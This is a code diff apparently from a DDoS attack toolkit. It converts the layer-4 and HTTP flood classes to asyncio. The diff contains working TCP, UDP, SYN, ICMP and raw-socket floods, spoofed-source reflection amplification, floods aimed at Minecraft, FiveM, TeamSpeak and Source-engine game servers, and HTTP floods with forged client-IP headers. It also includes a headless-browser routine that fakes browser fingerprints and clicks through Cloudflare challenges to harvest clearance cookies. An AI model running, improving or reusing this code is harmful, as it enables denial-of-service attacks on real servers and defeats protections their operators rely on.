+            logger.error("[!] Playwright is not installed. CFBUAM requires playwright or nodriver.")
             return None, None
             
-        logger.info(f"{bcolors.OKCYAN}[*] Headless Recon: Initializing headless browser for {url}...{bcolors.RESET}")
-        
+        if not user_agent:
+            user_agent = ML_ENGINE.get_fingerprint()["ua"]
+
+        is_windows = sys.platform.lower().startswith('win')
         try:
             with sync_playwright() as p:
                 launch_args = {
-                    "headless": True,
+                    "headless": not is_windows, # Turnstile frequently requires a real rendering context
                     "args": [
                         "--disable-blink-features=AutomationControlled",
-                        "--disable-infobars",
                         "--no-sandbox",
                         "--disable-setuid-sandbox",
                         "--ignore-certificate-errors",
-                        "--disable-extensions"
-                    ]
+                        "--disable-web-security",
+                        "--allow-running-insecure-content",
+                        "--disable-infobars",
+                        "--window-position=-32000,-32000",
+                        "--ignore-certifcate-errors",
+                        "--ignore-certifcate-errors-spki-list",
+                    ],
+                    "ignore_default_args": ["--enable-automation"]
                 }
                 
                 if proxy:
@@ -950,45 +1438,130 @@ class BrowserEngine:
                     launch_args["proxy"] = {"server": proxy_url}
                     
                 browser = p.chromium.launch(**launch_args)
-                
-                # Create a stealthy context
                 context = browser.new_context(
-                    viewport={'width': 1920, 'height': 1080},
-                    user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-                    locale='en-US',
-                    timezone_id='America/New_York'
+                    viewport={'width': 1920 + randint(-10, 10), 'height': 1080 + randint(-10, 10)},
+                    user_agent=user_agent,
+                    device_scale_factor=1,
+                    has_touch=True,
                 )
                 
-                # Mock webdriver to False to bypass detection
-                context.add_init_script("""
-                    Object.defineProperty(navigator, 'webdriver', {
-                        get: () => undefined
-                    });
-                """)
-                
                 page = context.new_page()
-                page.set_default_timeout(timeout)
+                if STEALTH_INSTALLED:
+                    try:
+                        Stealth().apply_stealth_sync(page)
+                    except: pass
+                
+                page.add_init_script("""
+                    Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
+                    window.chrome = { runtime: {} };
+                    Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']});
+                    Object.defineProperty(navigator, 'plugins', {get: () => [1, 2, 3, 4, 5]});
+                    Object.defineProperty(navigator, 'deviceMemory', {get: () => 8});
+                    Object.defineProperty(navigator, 'hardwareConcurrency', {get: () => 8});
+                    
+                    const getParameter = WebGLRenderingContext.prototype.getParameter;
+                    WebGLRenderingContext.prototype.getParameter = function(parameter) {
+                        if (parameter === 37445) return 'Intel Inc.';
+                        if (parameter === 37446) return 'Intel(R) Iris(TM) Plus Graphics 640';
+                        return getParameter.apply(this, arguments);
+                    };
+                """)
                 
                 logger.info(f"{bcolors.OKCYAN}[*] Headless Recon: Navigating and solving challenges...{bcolors.RESET}")
                 
-                # Use domcontentloaded instead of networkidle as WAF challenges often have continuous background requests
                 try:
-                    response = page.goto(url, wait_until="domcontentloaded", timeout=timeout)
-                except PlaywrightTimeoutError:
-                    logger.warning(f"{bcolors.WARNING}[*] Headless Recon: Initial load timed out. Attempting to proceed with current state...{bcolors.RESET}")
+                    page.goto(url, wait_until="domcontentloaded", timeout=15000)
+                except Exception:
+                    pass
                 
-                # If still stuck on challenge, wait a bit longer for JS to execute
-                if "Just a moment" in page.title() or "Attention Required" in page.title() or "Cloudflare" in page.title():
-                    logger.info(f"{bcolors.WARNING}[*] Headless Recon: Waiting for JS challenge verification...{bcolors.RESET}")
-                    try:
-                        page.wait_for_selector("text=Just a moment", state="hidden", timeout=10000)
-                    except PlaywrightTimeoutError:
+                try:
+                    sleep(2)
+                    # Human-like scrolling jitter
+                    page.mouse.wheel(0, randint(200, 500))
+                    sleep(0.5)
+                    page.mouse.wheel(0, -randint(200, 500))
+                    
+                    solved = False
+                    for attempt in range(15):
+                        page.wait_for_timeout(1000)
+                        
+                        # Check frame URLs (Most reliable for Cloudflare Turnstile)
+                        for frame in page.frames:
+                            try:
+                                f_url = frame.url.lower()
+                                if any(k in f_url for k in ["cloudflare", "turnstile", "challenge"]):
+                                    logger.info(f"{bcolors.OKCYAN}[*] Headless Recon: Challenge widget found in frame. Interaction pulse {attempt+1}...{bcolors.RESET}")
+                                    box = frame.frame_element().bounding_box()
+                                    if box:
+                                        target_x = box['x'] + (box['width'] * 0.15)
+                                        target_y = box['y'] + (box['height'] * 0.5)
+                                        page.mouse.move(target_x, target_y, steps=10)
+                                        sleep(0.5)
+                                        page.mouse.click(target_x, target_y)
+                                        logger.debug(f"[*] Headless Recon: Pulse click at {target_x}, {target_y}")
+                                        solved = True
+                                        break
+                            except: continue
+                            
+                        # Fallback: CSS Selectors without timeout blocking
+                        if not solved:
+                            selectors = ["input[type='checkbox']", "#challenge-stage", "div.ctp-checkbox-container", ".check", "[role='checkbox']", "#cf-stage"]
+                            for selector in selectors:
+                                try:
+                                    if page.locator(selector).count() > 0 and page.locator(selector).is_visible():
+                                        logger.info(f"{bcolors.OKCYAN}[*] Headless Recon: Challenge widget detected on main page. Pulse {attempt+1}...{bcolors.RESET}")
+                                        page.locator(selector).click(timeout=2000, delay=100)
+                                        solved = True
+                                        break
+                                except: pass
+                                
+                        if solved: 
+                            page.wait_for_timeout(3000)
+                            try:
+                                if "just a moment" not in page.title().lower():
+                                    break
+                            except Exception as e:
+                                if "Execution context was destroyed" in str(e):
+                                    logger.info(f"{bcolors.OKGREEN}[*] Headless Recon: Navigation detected. Challenge likely bypassed.{bcolors.RESET}")
+                                    break
+                            solved = False
+                        
+                        # Background JS Challenges require simple mouse movement without clicks
+                        page.mouse.move(randint(100, 900), randint(100, 900), steps=5)
+                        sleep(1.0)
+                except Exception as e:
+                    if "Execution context was destroyed" in str(e):
+                        logger.info(f"{bcolors.OKGREEN}[*] Headless Recon: Navigation detected during interaction.{bcolors.RESET}")
+                    else:
                         pass
+
+                logger.info(f"{bcolors.OKCYAN}[*] Headless Recon: Waiting for bypass validation...{bcolors.RESET}")
+                for i in range(40):
+                    cookies_list = context.cookies()
+                    if any(c['name'] == 'cf_clearance' for c in cookies_list):
+                        logger.info(f"{bcolors.OKGREEN}[*] Headless Recon: Cloudflare Clearance Obtained!{bcolors.RESET}")
+                        break
+                    
+                    try: 
+                        title = page.title().lower()
+                        content = page.content().lower()
+                        is_challenge = any(k in title or k in content for k in ["just a moment", "checking your browser", "enable javascript", "access denied", "attention required"])
+                        if not is_challenge and title != "" and len(content) > 2000:
+                            logger.info(f"{bcolors.OKGREEN}[*] Headless Recon: Barrier Breached (Fidelity: HIGH).{bcolors.RESET}")
+                            break
+                    except Exception as e:
+                        if "Execution context was destroyed" in str(e):
+                            logger.info(f"{bcolors.OKGREEN}[*] Headless Recon: Context destroyed (Navigated). Extracting cookies...{bcolors.RESET}")
+                            break
+                    sleep(1.5)
                 
-                title = page.title()
-                logger.info(f"{bcolors.OKGREEN}[*] Headless Recon: Navigation complete. Page Title: {title}{bcolors.RESET}")
+                final_title = ""
+                try: 
+                    final_title = page.title()
+                    final_title = str(final_title).encode('ascii', 'ignore').decode('ascii')
+                except: pass
+                logger.info(f"{bcolors.OKGREEN}[*] Headless Recon: Protocol finished. Page Title: {final_title}{bcolors.RESET}")
                 
-                # Extract solved cookies and user-agent
                 cookies_list = context.cookies()
                 cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in cookies_list])
                 ua = page.evaluate("navigator.userAgent")
@@ -999,7 +1572,6 @@ class BrowserEngine:
         except Exception as e:
             logger.error(f"{bcolors.FAIL}[!] Headless Recon Failed: {e}{bcolors.RESET}")
             return None, None
-
 
 class Minecraft:
     @staticmethod
@@ -1144,7 +1716,7 @@ class Minecraft:
         )
 
 
-class Layer4(Thread):
+class Layer4:
     _method: str
     _target: Tuple[str, int]
     _ref: Any
@@ -1157,11 +1729,10 @@ class Layer4(Thread):
         target: Tuple[str, int],
         ref: List[str] = None,
         method: str = "TCP",
-        synevent: Event = None,
+        synevent: asyncio.Event = None,
         proxy_pool: TacticalProxyPool = None,
         protocolid: int = 74,
     ):
-        Thread.__init__(self, daemon=True)
         self._amp_payload = None
         self._amp_payloads = cycle([])
         self._ref = ref
@@ -1185,12 +1756,15 @@ class Layer4(Thread):
             "MCBOT": self.MCBOT,
         }
 
-    def run(self) -> None:
+    async def run(self) -> None:
         if self._synevent:
-            self._synevent.wait()
+            while not self._synevent.is_set():
+                await asyncio.sleep(0.1)
+        
         self.select(self._method)
         while self._synevent.is_set():
-            self.SENT_FLOOD()
+            await self.SENT_FLOOD()
+            await asyncio.sleep(0) # Yield control to event loop to prevent stalls
 
     def open_connection(
         self, conn_type=AF_INET, sock_type=SOCK_STREAM, proto_type=IPPROTO_TCP
@@ -1201,166 +1775,216 @@ class Layer4(Thread):
             if proxy:
                 try:
                     s = proxy.open_socket(conn_type, sock_type, proto_type)
+                    s.settimeout(0.9)
+                    s.connect(self._target)
+                    return s
                 except Exception:
                     self._proxy_pool.report_failure(proxy)
+                    if 's' in locals() and s:
+                        with suppress(Exception): s.close()
                     raise
             else:
                 s = socket(conn_type, sock_type, proto_type)
         else:
             s = socket(conn_type, sock_type, proto_type)
+        
         s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
         s.settimeout(0.9)
-        try:
-            s.connect(self._target)
-        except Exception:
-            if proxy and self._proxy_pool:
-                self._proxy_pool.report_failure(proxy)
-            raise
+        s.connect(self._target)
         return s
 
-    def TCP(self) -> None:
-        s = None
-        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
-            while Tools.send(s, randbytes(1024)):
-                continue
-        Tools.safe_close(s)
+    async def TCP(self) -> None:
+        def _flood():
+            try:
+                s = self.open_connection(AF_INET, SOCK_STREAM)
+                with s:
+                    while self._synevent.is_set() and Tools.send(s, randbytes(1024)):
+                        continue
+            except: pass
+        await asyncio.to_thread(_flood)
 
-    def MINECRAFT(self) -> None:
+    async def MINECRAFT(self) -> None:
         handshake = Minecraft.handshake(self._target, self.protocolid, 1)
         ping = Minecraft.data(b"\x00")
-        s = None
-        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
-            while Tools.send(s, handshake):
-                Tools.send(s, ping)
-        Tools.safe_close(s)
+        def _flood():
+            try:
+                s = self.open_connection(AF_INET, SOCK_STREAM)
+                with s:
+                    while self._synevent.is_set() and Tools.send(s, handshake):
+                        Tools.send(s, ping)
+            except: pass
+        await asyncio.to_thread(_flood)
 
-    def CPS(self) -> None:
+    async def CPS(self) -> None:
         global REQUESTS_SENT
-        s = None
-        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
-            REQUESTS_SENT += 1
-        Tools.safe_close(s)
+        def _flood():
+            try:
+                s = self.open_connection(AF_INET, SOCK_STREAM)
+                s.close()
+                global REQUESTS_SENT
+                REQUESTS_SENT += 1
+            except: pass
+        await asyncio.to_thread(_flood)
 
-    def alive_connection(self) -> None:
-        s = None
-        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
-            while s.recv(1):
-                continue
-        Tools.safe_close(s)
+    async def alive_connection(self) -> None:
+        def _flood():
+            try:
+                s = self.open_connection(AF_INET, SOCK_STREAM)
+                with s:
+                    while self._synevent.is_set():
+                        s.recv(1)
+            except: pass
+        await asyncio.to_thread(_flood)
 
-    def CONNECTION(self) -> None:
+    async def CONNECTION(self) -> None:
         global REQUESTS_SENT
-        with suppress(Exception):
-            Thread(target=self.alive_connection).start()
-            REQUESTS_SENT += 1
+        asyncio.create_task(self.alive_connection())
+        REQUESTS_SENT += 1
 
-    def UDP(self) -> None:
-        s = None
-        with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
-            while Tools.sendto(s, randbytes(1024), self._target):
-                continue
-        Tools.safe_close(s)
+    async def UDP(self) -> None:
+        """Optimized UDP flood using asyncio-friendly socket handling."""
+        def _flood():
+            with socket(AF_INET, SOCK_DGRAM) as s:
+                data = randbytes(1024)
+                target = self._target
+                while self._synevent.is_set():
+                    try:
+                        s.sendto(data, target)
+                        global BYTES_SEND, REQUESTS_SENT
+                        BYTES_SEND += 1024
+                        REQUESTS_SENT += 1
+                    except Exception:
+                        continue
+        await asyncio.to_thread(_flood)
 
-    def OVHUDP(self) -> None:
-        with socket(AF_INET, SOCK_RAW, IPPROTO_UDP) as s:
-            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
-            while True:
-                for payload in self._generate_ovhudp():
-                    Tools.sendto(s, payload, self._target)
-        Tools.safe_close(s)
+    async def OVHUDP(self) -> None:
+        def _flood():
+            with socket(AF_INET, SOCK_RAW, IPPROTO_UDP) as s:
+                s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
+                while self._synevent.is_set():
+                    for payload in self._generate_ovhudp():
+                        try:
+                            s.sendto(payload, self._target)
+                            global BYTES_SEND, REQUESTS_SENT
+                            BYTES_SEND += len(payload)
+                            REQUESTS_SENT += 1
+                        except Exception:
+                            continue
+        await asyncio.to_thread(_flood)
 
-    def ICMP(self) -> None:
-        payload = self._genrate_icmp()
-        s = None
-        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_ICMP) as s:
-            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
-            while Tools.sendto(s, payload, self._target):
-                continue
-        Tools.safe_close(s)
+    async def ICMP(self) -> None:
+        def _flood():
+            payload = self._genrate_icmp()
+            with socket(AF_INET, SOCK_RAW, IPPROTO_ICMP) as s:
+                s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
+                while self._synevent.is_set():
+                    try:
+                        s.sendto(payload, self._target)
+                        global BYTES_SEND, REQUESTS_SENT
+                        BYTES_SEND += len(payload)
+                        REQUESTS_SENT += 1
+                    except Exception:
+                        continue
+        await asyncio.to_thread(_flood)
 
-    def SYN(self) -> None:
-        s = None
-        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
-            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
-            while Tools.sendto(s, self._genrate_syn(), self._target):
-                continue
-        Tools.safe_close(s)
+    async def SYN(self) -> None:
+        """High-efficiency SYN flood with pre-calculated templates."""
+        def _flood():
+            with socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
+                s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
+                target_addr = self._target[0]
+                while self._synevent.is_set():
+                    packet = self._genrate_syn()
+                    try:
+                        s.sendto(packet, (target_addr, 0))
+                        global BYTES_SEND, REQUESTS_SENT
+                        BYTES_SEND += len(packet)
+                        REQUESTS_SENT += 1
+                    except Exception:
+                        continue
+        await asyncio.to_thread(_flood)
 
-    def AMP(self) -> None:
-        s = None
-        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_UDP) as s:
-            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
-            while Tools.sendto(s, *next(self._amp_payloads)):
-                continue
-        Tools.safe_close(s)
+    async def AMP(self) -> None:
+        """High-efficiency Amplification flood."""
+        def _flood():
+            # Pre-fetch payload generator to avoid cycle overhead
+            payload_gen = self._amp_payloads
+            with socket(AF_INET, SOCK_RAW, IPPROTO_UDP) as s:
+                s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
+                while self._synevent.is_set():
+                    packet, addr = next(payload_gen)
+                    try:
+                        s.sendto(packet, addr)
+                        global BYTES_SEND, REQUESTS_SENT
+                        BYTES_SEND += len(packet)
+                        REQUESTS_SENT += 1
+                    except Exception:
+                        continue
+        await asyncio.to_thread(_flood)
 
-    def MCBOT(self) -> None:
-        s = None
-        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
-            Tools.send(
-                s,
-                Minecraft.handshake_forwarded(
-                    self._target,
-                    self.protocolid,
-                    2,
-                    ProxyTools.Random.rand_ipv4(),
-                    uuid4(),
-                ),
-            )
-            username = f"{con['MCBOT']}{ProxyTools.Random.rand_str(5)}"
-            password = b64encode(username.encode()).decode()[:8].title()
-            Tools.send(s, Minecraft.login(self.protocolid, username))
-            sleep(1.5)
-            Tools.send(
-                s,
-                Minecraft.chat(
-                    self.protocolid, "/register %s %s" % (password, password)
-                ),
-            )
-            Tools.send(s, Minecraft.chat(self.protocolid, "/login %s" % password))
-            while Tools.send(
-                s, Minecraft.chat(self.protocolid, str(ProxyTools.Random.rand_str(256)))
-            ):
-                sleep(1.1)
-        Tools.safe_close(s)
+    async def MCBOT(self) -> None:
+        """Advanced Minecraft Bot flood."""
+        def _flood():
+            try:
+                s = self.open_connection(AF_INET, SOCK_STREAM)
+                with s:
+                    Tools.send(s, Minecraft.handshake_forwarded(self._target, self.protocolid, 2, ProxyTools.Random.rand_ipv4(), uuid4()))
+                    username = f"MCBOT_{ProxyTools.Random.rand_str(5)}"
+                    password = b64encode(username.encode()).decode()[:8].title()
+                    Tools.send(s, Minecraft.login(self.protocolid, username))
+                    sleep(1.5)
+                    Tools.send(s, Minecraft.chat(self.protocolid, f"/register {password} {password}"))
+                    Tools.send(s, Minecraft.chat(self.protocolid, f"/login {password}"))
+                    while self._synevent.is_set():
+                        if not Tools.send(s, Minecraft.chat(self.protocolid, str(ProxyTools.Random.rand_str(128)))): break
+                        sleep(1.1)
+            except Exception: pass
+        await asyncio.to_thread(_flood)
 
-    def VSE(self) -> None:
-        payload = b"\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00"
-        with socket(AF_INET, SOCK_DGRAM) as s:
-            while Tools.sendto(s, payload, self._target):
-                continue
-        Tools.safe_close(s)
+    async def VSE(self) -> None:
+        """Valve Source Engine flood."""
+        payload = b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00'
+        def _flood():
+            with socket(AF_INET, SOCK_DGRAM) as s:
+                while self._synevent.is_set():
+                    try:
+                        s.sendto(payload, self._target)
+                        global BYTES_SEND, REQUESTS_SENT
+                        BYTES_SEND += len(payload)
+                        REQUESTS_SENT += 1
+                    except Exception: continue
+        await asyncio.to_thread(_flood)
 
-    def FIVEMTOKEN(self) -> None:
+    async def FIVEMTOKEN(self) -> None:
         token = str(uuid4())
         steamid_min, steamid_max = 76561197960265728, 76561199999999999
         guid = str(randint(steamid_min, steamid_max))
         payload = f"token={token}&guid={guid}".encode("utf-8")
         with socket(AF_INET, SOCK_DGRAM) as s:
             while Tools.sendto(s, payload, self._target):
+                await asyncio.sleep(0)
                 continue
-        Tools.safe_close(s)
 
-    def FIVEM(self) -> None:
+    async def FIVEM(self) -> None:
         payload = b"\xff\xff\xff\xffgetinfo xxx\x00\x00\x00"
         with socket(AF_INET, SOCK_DGRAM) as s:
             while Tools.sendto(s, payload, self._target):
+                await asyncio.sleep(0)
                 continue
-        Tools.safe_close(s)
 
-    def TS3(self) -> None:
+    async def TS3(self) -> None:
         payload = b"\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02"
         with socket(AF_INET, SOCK_DGRAM) as s:
             while Tools.sendto(s, payload, self._target):
+                await asyncio.sleep(0)
                 continue
-        Tools.safe_close(s)
 
-    def MCPE(self) -> None:
+    async def MCPE(self) -> None:
         payload = b"\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x20\x6d\x79\x20\x6f\x77\x6e\x20\x61\x73\x73\x20\x61\x6d\x70\x2f\x74\x72\x69\x70\x68\x65\x6e\x74\x20\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64\x20\x62\x61\x6c\x6c\x73"
         with socket(AF_INET, SOCK_DGRAM) as s:
             while Tools.sendto(s, payload, self._target):
+                await asyncio.sleep(0)
                 continue
-        Tools.safe_close(s)
 
     def _generate_ovhudp(self) -> List[bytes]:
         packets = []
@@ -1411,16 +2035,20 @@ class Layer4(Thread):
         return ip.get_packet()
 
     def _generate_amp(self):
+        """Pre-calculate amplification packets for high-speed delivery."""
         payloads = []
         for ref in self._ref:
-            ip, ud = IP(), UDP()
-            ip.set_ip_src(self._target[0])
-            ip.set_ip_dst(ref)
-            ud.set_uh_dport(self._amp_payload[1])
-            ud.set_uh_sport(self._target[1])
-            ud.contains(Data(self._amp_payload[0]))
-            ip.contains(ud)
-            payloads.append((ip.get_packet(), (ref, self._amp_payload[1])))
+            try:
+                ip, ud = IP(), UDP()
+                ip.set_ip_src(self._target[0])
+                ip.set_ip_dst(ref)
+                ud.set_uh_dport(self._amp_payload[1])
+                ud.set_uh_sport(self._target[1])
+                ud.contains(Data(self._amp_payload[0]))
+                ip.contains(ud)
+                payloads.append((ip.get_packet(), (ref, self._amp_payload[1])))
+            except Exception:
+                continue
         return payloads
 
     def select(self, name):
@@ -1483,11 +2111,47 @@ class Layer4(Thread):
                 )
 
 
-class HttpFlood(Thread):
-    _proxy_pool: TacticalProxyPool = None
+class AsyncHTTPManager:
+    """Centralized manager for aiohttp sessions to maximize connection reuse."""
+    _session: Optional[aiohttp.ClientSession] = None
+    _lock = asyncio.Lock()
+
+    @classmethod
+    async def get_session(cls) -> aiohttp.ClientSession:
+        if cls._session is None or cls._session.closed:
+            async with cls._lock:
+                if cls._session is None or cls._session.closed:
+                    connector = aiohttp.TCPConnector(
+                        ssl=False, 
+                        limit=0, 
+                        ttl_dns_cache=300,
+                        use_dns_cache=True
+                    )
+                    timeout = aiohttp.ClientTimeout(total=10, connect=5)
+                    cls._session = aiohttp.ClientSession(
+                        connector=connector, 
+                        timeout=timeout,
+                        headers={"Connection": "keep-alive"}
+                    )
+        return cls._session
+
+    @classmethod
+    async def close(cls):
+        if cls._session and not cls._session.closed:
+            await cls._session.close()
+            cls._session = None
+
+
+import concurrent.futures
+
+# Global executor for synchronous methods (CFB, BYPASS, DGB)
+# This prevents asyncio.to_thread from bottlenecking on the default max_workers limit (which is small).
+SYNC_EXECUTOR = concurrent.futures.ThreadPoolExecutor(max_workers=2000)
+
+class HttpFlood:
     _cfbuam_cookie: str = None
     _cfbuam_ua: str = None
-    _cfbuam_lock = Lock()
+    _cfbuam_lock = asyncio.Lock()
     
     _payload: str
     _defaultpayload: Any
@@ -1497,7 +2161,8 @@ class HttpFlood(Thread):
     _target: URL
     _method: str
     _rpc: int
-    _synevent: Any
+    _synevent: asyncio.Event
+    _proxy_pool: TacticalProxyPool
     SENT_FLOOD: Any
 
     def __init__(
@@ -1507,12 +2172,11 @@ class HttpFlood(Thread):
         host: str,
         method: str = "GET",
         rpc: int = 1,
-        synevent: Event = None,
+        synevent: asyncio.Event = None,
         useragents: Set[str] = None,
         referers: Set[str] = None,
         proxy_pool: TacticalProxyPool = None,
     ) -> None:
-        Thread.__init__(self, daemon=True)
         self.SENT_FLOOD = None
         (
             self._thread_id,
@@ -1559,6 +2223,9 @@ class HttpFlood(Thread):
             "BOMB": self.BOMB,
             "PPS": self.PPS,
             "KILLER": self.KILLER,
+            "HEAD": self.HEAD,
+            "IMPERSONATE": self.IMPERSONATE,
+            "HTTP3": self.HTTP3,
         }
         if not referers:
             referers = [
@@ -1610,41 +2277,46 @@ class HttpFlood(Thread):
         self._useragents, self._req_type = list(useragents), self.getMethodType(method)
         self._rebuild_payload()
 
+    async def _get_session(self) -> aiohttp.ClientSession:
+        """Utilizes the centralized session manager."""
+        return await AsyncHTTPManager.get_session()
+
     def _rebuild_payload(self):
         """Advanced Fingerprinting: Rebuilds payload with dynamic, realistic browser headers."""
-        self._defaultpayload = "%s %s HTTP/%s\r\n" % (
-            self._req_type,
-            self._target.raw_path_qs,
-            randchoice(["1.0", "1.1", "1.2"]),
-        )
+        self._method_bytes = self._req_type.encode()
+        self._path_bytes = self._target.raw_path_qs.encode()
+        self._host_bytes = self._target.authority.encode()
+        self._raw_host_bytes = self._target.raw_host.encode()
+        self._host_header = b"Host: " + self._host_bytes + b"\r\n"
         
         # Use ML Engine if evasion is enabled
         if "--evasion" in argv:
             best_fp = ML_ENGINE.get_fingerprint()
             self._current_fp_id = best_fp["id"]
             self._current_delay = best_fp["delay"]
-            selected_fp = best_fp["headers"]
-            conn_type = randchoice(["keep-alive", "Upgrade"])
-            # Update user agents based on the engine pick
-            self._useragents = [best_fp["ua"]]
+            self._fp_headers_bytes = best_fp["headers"].encode()
+            self._conn_type_bytes = b"Connection: " + randchoice([b"keep-alive", b"Upgrade"]) + b"\r\n"
+            self._useragents_bytes = [ua.encode() for ua in [best_fp["ua"]]]
         else:
             self._current_fp_id = None
             self._current_delay = 0.0
-            selected_fp = (
-                "Accept-Encoding: gzip, deflate, br\r\n"
-                "Accept-Language: en-US,en;q=0.9\r\n"
-                "Cache-Control: max-age=0\r\n"
-                "Sec-Fetch-Dest: document\r\n"
-                "Sec-Fetch-Mode: navigate\r\n"
-                "Sec-Fetch-Site: none\r\n"
-                "Sec-Fetch-User: ?1\r\n"
-                "Sec-Gpc: 1\r\n"
-                "Pragma: no-cache\r\n"
-                "Upgrade-Insecure-Requests: 1\r\n"
+            self._fp_headers_bytes = (
+                b"Accept-Encoding: gzip, deflate, br\r\n"
+                b"Accept-Language: en-US,en;q=0.9\r\n"
+                b"Cache-Control: max-age=0\r\n"
+                b"Sec-Fetch-Dest: document\r\n"
+                b"Sec-Fetch-Mode: navigate\r\n"
+                b"Sec-Fetch-Site: none\r\n"
+                b"Sec-Fetch-User: ?1\r\n"
+                b"Sec-Gpc: 1\r\n"
+                b"Pragma: no-cache\r\n"
+                b"Upgrade-Insecure-Requests: 1\r\n"
             )
-            conn_type = "keep-alive"
-
-        self._payload = self._defaultpayload + selected_fp + f"Connection: {conn_type}\r\n"
+            self._conn_type_bytes = b"Connection: keep-alive\r\n"
+            self._useragents_bytes = [ua.encode() for ua in self._useragents]
+        
+        self._referers_bytes = [ref.encode() for ref in self._referers]
+        self._target_repr_quoted = parse.quote(self._target.human_repr()).encode()
 
     def select(self, name: str) -> None:
         self.SENT_FLOOD = self.GET
@@ -1652,9 +2324,10 @@ class HttpFlood(Thread):
             if name == key:
                 self.SENT_FLOOD = value
 
-    def run(self) -> None:
+    async def run(self) -> None:
         if self._synevent:
-            self._synevent.wait()
+            while not self._synevent.is_set():
+                await asyncio.sleep(0.1)
         self.select(self._method)
         original_rpc = self._rpc
         smart_rpc_enabled = "--smart" in argv
@@ -1664,7 +2337,7 @@ class HttpFlood(Thread):
             if evasion_enabled:
                 self._rebuild_payload()
                 if self._current_delay > 0:
-                    sleep(self._current_delay)
+                    await asyncio.sleep(self._current_delay)
                     
             if smart_rpc_enabled:
                 # Smart RPC Adjustment
@@ -1674,60 +2347,120 @@ class HttpFlood(Thread):
                     self._rpc = original_rpc
 
             try:
-                self.SENT_FLOOD()
+                await self.SENT_FLOOD()
                 # If we get here, no direct exception occurred in the flood method
                 if evasion_enabled and self._current_fp_id:
                     # Reward or penalize based on latency
                     is_success = (CURRENT_LATENCY.value != -1.0 and CURRENT_LATENCY.value < 3000)
-                    ML_ENGINE.report_result(self._current_fp_id, is_success)
+                    await asyncio.to_thread(ML_ENGINE.report_result, self._current_fp_id, is_success)
             except Exception:
                 if evasion_enabled and self._current_fp_id:
-                    ML_ENGINE.report_result(self._current_fp_id, False)
+                    await asyncio.to_thread(ML_ENGINE.report_result, self._current_fp_id, False)
+            
+            await asyncio.sleep(0) # Yield control to event loop to prevent stalls
 
-    @property
-    def SpoofIP(self) -> str:
-        spoof: str = ProxyTools.Random.rand_ipv4()
-        return (
-            "X-Forwarded-Proto: Http\r\n"
-            f"X-Forwarded-Host: {self._target.raw_host}, 1.1.1.1\r\n"
-            f"Via: {spoof}\r\n"
-            f"Client-IP: {spoof}\r\n"
-            f"X-Forwarded-For: {spoof}\r\n"
-            f"Real-IP: {spoof}\r\n"
-        )
+    def generate_payload(self, other: bytes = None) -> bytes:
+        """High-efficiency byte assembly to minimize CPU overhead in flood loops."""
+        spoof = ProxyTools.Random.rand_ipv4().encode()
+        
+        return b"".join([
+            self._method_bytes, b" ", self._path_bytes, b" HTTP/1.1\r\n",
+            self._host_header,
+            self._conn_type_bytes,
+            b"User-Agent: ", randchoice(self._useragents_bytes), b"\r\n",
+            b"Referer: ", randchoice(self._referers_bytes), self._target_repr_quoted, b"\r\n",
+            self._fp_headers_bytes,
+            b"X-Forwarded-For: ", spoof, b"\r\n",
+            b"Client-IP: ", spoof, b"\r\n",
+            b"Real-IP: ", spoof, b"\r\n",
+            other if other else b"",
+            b"\r\n"
+        ])
 
-    def generate_payload(self, other: str = None) -> bytes:
-        return str.encode(
-            (
-                self._payload
-                + f"Host: {self._target.authority}\r\n"
-                + self.randHeadercontent
-                + (other if other else "")
-                + "\r\n"
-            )
-        )
-
-    def open_connection(self, host=None) -> socket:
+    async def open_connection(self, host=None):
+        proxy = None
         if self._proxy_pool:
             proxy = self._proxy_pool.get_proxy()
+            
+        try:
             if proxy:
-                sock = proxy.open_socket(AF_INET, SOCK_STREAM)
+                # logger.debug(f"[*] Connecting via proxy: {proxy}")
+                sock = await asyncio.to_thread(proxy.open_socket, AF_INET, SOCK_STREAM)
+                await asyncio.to_thread(sock.connect, host or self._raw_target)
+                sock.setblocking(False)
             else:
                 sock = socket(AF_INET, SOCK_STREAM)
-        else:
-            sock = socket(AF_INET, SOCK_STREAM)
-        sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
-        sock.settimeout(0.9)
-        sock.connect(host or self._raw_target)
-        if self._target.scheme.lower() == "https":
-            sock = ctx.wrap_socket(
-                sock,
-                server_hostname=host[0] if host else self._target.host,
-                server_side=False,
-                do_handshake_on_connect=True,
-                suppress_ragged_eofs=True,
-            )
-        return sock
+                sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
+                sock.setblocking(False)
+                loop = asyncio.get_event_loop()
